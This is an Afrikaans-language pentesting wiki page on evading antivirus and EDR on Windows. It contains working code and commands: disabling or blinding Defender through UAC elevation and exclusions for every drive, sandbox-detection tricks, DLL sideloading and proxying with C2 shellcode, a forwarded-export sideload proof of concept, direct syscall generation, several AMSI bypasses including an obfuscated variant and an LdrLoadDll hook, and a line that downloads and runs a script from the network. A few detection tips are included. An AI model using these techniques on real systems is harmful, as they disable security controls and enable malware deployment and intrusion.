# Antivirus (AV)-omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is oorspronklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n Tool om te keer dat Windows Defender werk.
- [no-defender](https://github.com/es3n1n/no-defender): 'n Tool om te keer dat Windows Defender werk deur 'n ander AV na te boots.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-styl UAC-lokaas voordat met Defender gepeuter word

Openbare loaders wat hulle as game cheats voordoen, word dikwels as ongetekende Node.js/Nexe-installers versprei wat eers **die gebruiker vra om verhoogde regte toe te staan** en dan eers Defender buite werking stel. Die proses is eenvoudig:

1. Toets vir administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die oproeper adminregte het, dus dui 'n mislukking aan dat die loader as 'n standaardgebruiker loop.
2. Herbegin homself onmiddellik met die `RunAs`-werkwoord om die verwagte UAC-toestemmingsprompt te aktiveer terwyl die oorspronklike opdragreël behoue bly.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Slagoffers glo reeds dat hulle “gekraakte” sagteware installeer, daarom aanvaar hulle gewoonlik die versoek, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.<sup>[[26]](#references)</sup>

### Omvattende `MpPreference`-uitsluitings vir elke skyfletter

Sodra dit verhoogde regte het, maksimeer GachiLoader-agtige kettings Defender se blinde kolle in plaas daarvan om die diens heeltemal te deaktiveer. Die loader beëindig eers die GUI-watchdog (`taskkill /F /IM SecHealthUI.exe`) en stel dan **uiters omvattende uitsluitings** in sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key waarnemings:

- Die lus gaan deur elke gemonteerde lêerstelsel (D:\, E:\, USB-stokkies, ens.), dus word **enige toekomstige payload wat enige plek op die skyf geplaas word, geïgnoreer**.
- Die uitsluiting van die `.sys`-uitbreiding is vooruitdenkend—aanvallers behou die opsie om later ongetekende drywers te laai sonder om Defender weer aan te raak.
- Alle veranderinge word onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` aangebring, sodat latere fases kan bevestig dat die uitsluitings behoue bly of dit kan uitbrei sonder om UAC weer te aktiveer.

Omdat geen Defender-diens gestop word nie, rapporteer eenvoudige gesondheidstoetse steeds “antivirus aktief”, al raak intydse inspeksie nooit daardie paaie nie.<sup>[[26]](#references)</sup>

## **AV-ontduikingsmetodologie**

AV’s gebruik tans verskillende metodes om te bepaal of ’n lêer kwaadwillig is of nie: statiese opsporing, dinamiese analise en, vir die meer gevorderde EDR’s, gedragsanalise.

### **Statiese opsporing**

Statiese opsporing word bewerkstellig deur bekende kwaadwillige stringe of grepe-reekse in ’n binêre lêer of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digitale handtekeninge, ikoon, kontrolesom, ens.). Dit beteken dat die gebruik van bekende publieke nutsprogramme jou makliker kan laat uitken, aangesien hulle waarskynlik reeds ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie soort opsporing te omseil:

- **Encryption**

As jy die binêre lêer enkripteer, sal AV nie jou program kan opspoor nie, maar jy sal ’n soort loader nodig hê om die program te dekripteer en in die geheue uit te voer.

- **Obfuscation**

Soms hoef jy net ’n paar stringe in jou binêre lêer of script te verander om dit by AV verby te kry, maar dit kan ’n tydrowende taak wees, afhangend van wat jy probeer verdoesel.

- **Custom tooling**

As jy jou eie nutsprogramme ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se statiese opsporing te toets, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel die lêer basies in verskeie segmente en laat Defender dan elkeen afsonderlik skandeer. Só kan dit jou presies vertel watter stringe of grepe in jou binêre lêer gemerk is.

Ek beveel sterk aan dat jy na hierdie [YouTube-snitlys](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV-ontduiking kyk.

### **Dinamiese analise**

Dinamiese analise is wanneer AV jou binêre lêer in ’n sandbox uitvoer en na kwaadwillige aktiwiteit kyk (bv. probeer om jou blaaier se wagwoorde te dekripteer en lees, ’n minidump van LSASS maak, ens.). Hierdie deel kan ’n bietjie lastiger wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Slaap voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit ’n uitstekende manier wees om AV se dinamiese analise te omseil. AV’s het baie min tyd om lêers te skandeer sonder om die gebruiker se werkvloei te onderbreek, dus kan lang slaaptye die analise van binêre lêers ontwrig. Die probleem is dat baie AV-sandboxes die slaaptyd eenvoudig kan oorslaan, afhangend van hoe dit geïmplementeer is.
- **Kontroleer die masjien se hulpbronne** Sandboxes het gewoonlik baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief raak, byvoorbeeld deur die CPU se temperatuur of selfs die waaierspoed na te gaan—nie alles sal in die sandbox geïmplementeer wees nie.
- **Masjienspesifieke kontroles** As jy ’n gebruiker wil teiken wie se werkstasie aan die "contoso.local"-domein gekoppel is, kan jy die rekenaar se domein nagaan om te sien of dit ooreenstem met die een wat jy gespesifiseer het. As dit nie ooreenstem nie, kan jy jou program laat afsluit.

Dit blyk dat Microsoft Defender se sandbox-rekenaarnaam HAL9TH is. Jy kan dus die rekenaarnaam in jou malware nagaan voordat dit ontplof; as die naam HAL9TH is, beteken dit dat jy binne Defender se sandbox is, en kan jy jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar uitstekende wenke van [@mgeeky](https://twitter.com/mariuszbit) om sandboxes te ontduik

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie plasing gesê het, sal **publieke nutsprogramme** uiteindelik **opgespoor word**, dus moet jy jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander, minder bekende projek gebruik wat ook LSASS dump?

Laasgenoemde is waarskynlik die regte antwoord. Mimikatz is waarskynlik een van die malware-projekte wat die meeste deur AV’s en EDR’s gemerk word—indien nie die meeste nie. Hoewel die projek self baie cool is, is dit ook ’n nagmerrie om daarmee te werk as jy AV’s wil omseil. Soek dus bloot alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir ontduiking wysig, moet jy seker maak dat jy **outomatiese voorbeeldd indiening afskakel** in Defender, en asseblief, regtig, **MOENIE NA VIRUSTOTAL OPLAAI NIE** as jou doel is om ontduiking op lang termyn te bewerkstellig. As jy wil nagaan of ’n bepaalde AV jou payload opspoor, installeer dit op ’n VM, probeer om outomatiese voorbeeldd indiening af te skakel en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Waar moontlik, **gee altyd voorkeur aan DLLs vir ontduiking**. Volgens my ervaring word DLL-lêers gewoonlik **baie minder opgespoor** en ontleed, dus is dit ’n baie eenvoudige truuk om in sommige gevalle opsporing te vermy (as jou payload natuurlik op ’n manier as ’n DLL kan loop).

Soos ons in hierdie beeld kan sien, het ’n DLL-payload van Havoc ’n opsporingsyfer van 4/26 op antiscan.me, terwyl die EXE-payload ’n opsporingsyfer van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-vergelyking van ’n gewone Havoc EXE-payload met ’n gewone Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer onopvallend te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak gebruik van die DLL-soekvolgorde wat die loader gebruik deur die slagoffertoepassing en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan programme wat vatbaar is vir DLL Sideloading met [Siofra](https://github.com/Cybereason/siofra) en die volgende PowerShell-script nagaan:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Hierdie opdrag sal die lys van programme in "C:\Program Files\\" uitvoer wat vatbaar is vir DLL hijacking, asook die DLL-lêers wat hulle probeer laai.

Ek beveel sterk aan dat jy **self programme verken wat met DLL Hijack/Sideload gebruik kan word**. Hierdie tegniek is redelik stealthy as dit behoorlik uitgevoer word, maar as jy publiek bekende programme gebruik wat met DLL Sideload gebruik kan word, kan jy maklik gevang word.

As jy bloot ’n kwaadwillige DLL plaas met die naam van ’n DLL wat ’n program verwag om te laai, sal jou payload nie laai nie, want die program verwag dat daardie DLL spesifieke funksies bevat. Om hierdie probleem op te los, gebruik ons ’n ander tegniek genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die oproepe wat ’n program maak vanaf die proxy-DLL (wat kwaadwillig is) na die oorspronklike DLL. Só behou die program sy funksionaliteit en kan jou payload uitgevoer word.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Die laaste opdrag sal ons 2 lêers gee: ’n DLL-bronkode-sjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Hier is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het ’n opsporingsyfer van 0/26 in [antiscan.me](https://antiscan.me)! Ek sou sê dis ’n sukses.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy na [S3cur3Th1sShit se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, asook [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE), om meer te leer oor wat ons in meer diepte bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies uitvoer wat eintlik “forwarders” is: in plaas daarvan om na kode te verwys, bevat die uitvoerinskrywing ’n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer ’n oproeper die uitvoer oplos, sal die Windows-loader:

- `TargetDll` laai as dit nog nie gelaai is nie
- `TargetFunc` daaruit oplos

Belangrike gedrag om te verstaan:
- As `TargetDll` ’n KnownDLL is, word dit uit die beskermde KnownDLLs-naamruimte voorsien (bv. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- As `TargetDll` nie ’n KnownDLL is nie, word die normale DLL-soekvolgorde gebruik, wat die gids insluit van die module wat die forward-resolusie uitvoer.

Dit maak ’n indirekte sideloading-primitief moontlik: vind ’n ondertekende DLL wat ’n funksie uitvoer wat na ’n module met ’n naam wat nie ’n KnownDLL is nie, verwys, en plaas dan daardie ondertekende DLL saam met ’n aanvallerbeheerde DLL wat presies die naam van die verwysde teikenmodule het. Wanneer die forwarded export opgeroep word, los die loader die verwysing op en laai jou DLL uit dieselfde gids, waardeur jou DllMain uitgevoer word.<sup>[[13]](#references)</sup>

Voorbeeld waargeneem op Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` is nie ’n KnownDLL nie, dus word dit volgens die normale soekvolgorde opgelos.

PoC (copy-paste):
1) Kopieer die ondertekende stelsel-DLL na ’n skryfbare vouer
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas ’n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. ’n Minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die aangestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktiveer die forward met ’n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Terwyl `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, sal jy eers 'n "missing API"-fout kry nadat `DllMain` reeds uitgevoer is

Opsporingswenke:
- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports met nutsgoed soos die volgende lys:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11-forwarder-inventaris om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idees vir opsporing/verdediging:
- Monitor LOLBins (bv. rundll32.exe) wat signed DLLs vanaf nie-stelselpaadjies laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Stel waarskuwings in vir proses-/modulekettings soos: `rundll32.exe` → nie-stelsel-`keyiso.dll` → `NCRYPTPROV.dll` onder paaie waarop gebruikers kan skryf
- Dwing code integrity-beleide (WDAC/AppLocker) af en verbied skryf+uitvoer in toepassinggidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is 'n payload-gereedskapstel om EDRs te omseil deur opgeskorte prosesse, direkte syscalls en alternatiewe uitvoeringsmetodes te gebruik`

Jy kan Freeze gebruik om jou shellcode op 'n sluipende manier te laai en uit te voer.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is net ’n kat-en-muis-speletjie; wat vandag werk, kan môre opgespoor word. Moet dus nooit op net een hulpmiddel staatmaak nie. Probeer, indien moontlik, verskeie evasion-tegnieke saam gebruik.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR’s plaas dikwels **user-mode inline hooks** op `ntdll.dll`-syscall-stubs. Om daardie hooks te omseil, kan jy **direct** of **indirect** syscall-stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernmodus oorskakel sonder om die hooked export entrypoint uit te voer.<sup>[[32]](#references)</sup>

**Aanroepingsopsies:**
- **Direct (embedded)**: genereer ’n `syscall`/`sysenter`/`SVC #0`-instruksie in die gegenereerde stub (geen `ntdll`-export word aangeroep nie).
- **Indirect**: spring na ’n bestaande `syscall`-gadget binne `ntdll` sodat dit lyk asof die kernoorgang van `ntdll` af kom (nuttig vir heuristiese evasion); **randomized indirect** kies per aanroep ’n gadget uit ’n poel.
- **Egg-hunt**: vermy die inbedding van die statiese `0F 05`-opcode-volgorde op skyf; vind ’n syscall-volgorde tydens looptyd.

**Strategieë vir hook-bestande SSN-resolusie:**
- **FreshyCalls (VA sort)**: lei SSN’s af deur syscall-stubs volgens virtuele adres te sorteer, eerder as om stub-grepe te lees.
- **SyscallsFromDisk**: koppel ’n skoon `\KnownDlls\ntdll.dll`, lees SSN’s uit sy `.text` en ontkoppel dit dan (omseil alle hooks in geheue).
- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opcode-validering wanneer ’n stub skoon is; val terug op VA-afleiding indien dit hooked is.
- **HW Breakpoint**: stel DR0 op die `syscall`-instruksie en gebruik ’n VEH om die SSN tydens looptyd uit `EAX` vas te lê, sonder om hooked grepe te ontleed.

Voorbeeld van SysWhispers4-gebruik:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[lêerlose wanware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV's slegs **lêers op skyf** skandeer. As jy dus payloads op een of ander manier **direk in die geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is in die volgende Windows-komponente geïntegreer.

- User Account Control, of UAC (verhoging van EXE, COM, MSI of ActiveX-installasies)
- PowerShell (skrifte, interaktiewe gebruik en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA-makro's

Dit stel antivirusoplossings in staat om skripgedrag te inspekteer deur skripinhoud in 'n vorm bloot te stel wat ongeënkripteer en ongeofuskueer is.

As jy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` uitvoer, sal dit die volgende waarskuwing in Windows Defender veroorsaak.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` en daarna die pad na die uitvoerbare lêer waaruit die skrip uitgevoer is, byvoeg; in hierdie geval, powershell.exe

Ons het geen lêer na die skyf geskryf nie, maar is steeds in die geheue opgespoor as gevolg van AMSI.

Verder word C#-kode vanaf **.NET 4.8** ook deur AMSI verwerk. Dit raak selfs `Assembly.Load(byte[])` wanneer dit gebruik word om in-memory-uitvoering te laai. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of vroeër) vir in-memory-uitvoering aanbeveel as jy AMSI wil omseil.

Daar is 'n paar maniere om AMSI te omseil:

- **Ofuskering**

Aangesien AMSI hoofsaaklik met statiese opsporing werk, kan die wysiging van die skripte wat jy probeer laai 'n goeie manier wees om opsporing te ontduik.

AMSI kan egter skripte de-ofuskueer, selfs al het hulle verskeie lae. Afhangend van hoe dit gedoen word, kan ofuskering dus 'n swak opsie wees. Dit maak dit nie juis eenvoudig om opsporing te ontduik nie. Soms hoef jy egter net 'n paar veranderlike name te verander en dan is alles reg; dit hang dus af van hoe sterk iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit maklik om daarmee te peuter, selfs wanneer jy as 'n gebruiker sonder voorregte loop. Weens hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**'n Fout afdwing**

As jy AMSI-inisialisering dwing om te misluk (amsiInitFailed), sal geen skandering vir die huidige proses begin word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak, en Microsoft het 'n signature ontwikkel om wydverspreide gebruik te voorkom.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Al wat nodig was, was een reël PowerShell-kode om AMSI vir die huidige PowerShell-proses onbruikbaar te maak. Hierdie reël is natuurlik deur AMSI self gemerk, so ’n wysiging is nodig om hierdie tegniek te gebruik.

Hier is ’n gewysigde AMSI-bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Hou in gedagte dat dit waarskynlik gevlag sal word sodra hierdie plasing verskyn, dus moet jy geen kode publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik deur [@RastaMouse](https://twitter.com/_RastaMouse/) ontdek. Dit behels dat die adres van die "AmsiScanBuffer"-funksie in amsi.dll (wat verantwoordelik is vir die skandering van gebruiker-verskafte invoer) gevind word en met instruksies oorskryf word om die kode vir E_INVALIDARG terug te gee. Op hierdie manier gee die resultaat van die werklike skandering 0 terug, wat as 'n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke om AMSI met powershell te omseil. Kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**hierdie repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blokkeer AMSI deur te verhoed dat amsi.dll laai (LdrLoadDll hook)

AMSI word slegs geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taal-onafhanklike omseiling is om 'n user-mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die aangevraagde module `amsi.dll` is. Gevolglik laai AMSI nooit nie, en vind geen skanderings vir daardie proses plaas nie.<sup>[[23]](#references)</sup>

Implementeringsraamwerk (x64 C/C++-pseudokode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Werk met PowerShell, WScript/CScript en pasgemaakte loaders (enigiets wat andersins AMSI sou laai).
- Kombineer dit met die voer van scripts deur stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreëlartefakte te vermy.
- Is al gebruik met loaders wat deur LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` aanroep).

Die hulpmiddel **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook ’n script om AMSI te bypass.
Die hulpmiddel **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook ’n script om AMSI te bypass wat signature-detectie vermy deur ewekansige gebruiker-gedefinieerde funksies, veranderlikes en karakteruitdrukkings te gebruik, en deur die hooflettergebruik van PowerShell-sleutelwoorde ewekansig te verander.

**Verwyder die bespeurde signature**

Jy kan ’n hulpmiddel soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die bespeurde AMSI-signature uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel skandeer die geheue van die huidige proses vir die AMSI-signature en skryf dit dan met NOP-instruksies oor, waardeur dit effektief uit die geheue verwyder word.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan ’n lys van AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell-weergawe 2**
As jy PowerShell-weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder dat AMSI hulle skandeer. Jy kan dit so doen:

```bash
powershell.exe -version 2
```

## PS-logging

PowerShell-logging is ’n kenmerk waarmee jy alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, kan aanteken. Dit kan nuttig wees vir ouditering en probleemoplossing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil ontduik**.

Om PowerShell-logging te omseil, kan jy die volgende tegnieke gebruik:

- **Deaktiveer PowerShell Transcription en Module Logging**: Jy kan ’n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Gebruik PowerShell-weergawe 2**: As jy PowerShell-weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skrifte kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen: `powershell.exe -version 2`
- **Gebruik ’n unmanaged PowerShell-sessie**: Gebruik [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om PowerShell te huisves sonder om `powershell.exe` te begin (die benadering wat Cobalt Strike se `powerpick` gebruik). Dit omseil kontroles wat spesifiek aan die `powershell.exe`-proses gekoppel is, maar deaktiveer nie vanself AMSI, Script Block Logging of alle ander PowerShell-verdedigingsmaatreëls nie; dekking hang af van die runtime en gasheerimplementering.


## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke maak staat op die enkripsie van data, wat die entropie van die binary verhoog en dit vir AV’s en EDR’s makliker maak om dit op te spoor. Wees versigtig hiermee en pas enkripsie dalk net toe op spesifieke dele van jou kode wat sensitief is of versteek moet word.

### Deobfuscation van ConfuserEx-beskermde .NET-binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, kom jy dikwels verskeie beskermingslae teë wat decompilers en sandboxes blokkeer. Die werkvloei hieronder **herstel betroubaar ’n byna oorspronklike IL** wat daarna in nutsmiddels soos dnSpy of ILSpy na C# gedecompileer kan word.<sup>[[10]](#references)</sup>

1.  Verwydering van anti-tampering – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die statiese konstruktor van die *module* (`<Module>.cctor`). Dit pas ook die PE-kontrolesom aan, sodat enige wysiging die binary sal laat crash. Gebruik **AntiTamperKiller** om die geënkripteerde metadata-tabelle op te spoor, die XOR-sleutels te herwin en ’n skoon assembly te herskryf:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Uitvoer bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool-/beheer-vloei-herwinning – voer die *skoon* lêer aan **de4dot-cex** (’n ConfuserEx-bewuste fork van de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Vlaggies:
     • `-p crx` – kies die ConfuserEx 2-profiel
     • de4dot sal control-flow flattening ongedaan maak, die oorspronklike namespaces, klasse en veranderlikename herstel en konstante strings dekripteer.

3.  Proxy-call-verwydering – ConfuserEx vervang direkte metode-aanroepe met liggewig-omhulsels (oftewel *proxy calls*) om dekompilering verder te bemoeilik. Verwyder hulle met **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Ná hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige wrapper-funksies (`Class8.smethod_10`, …).

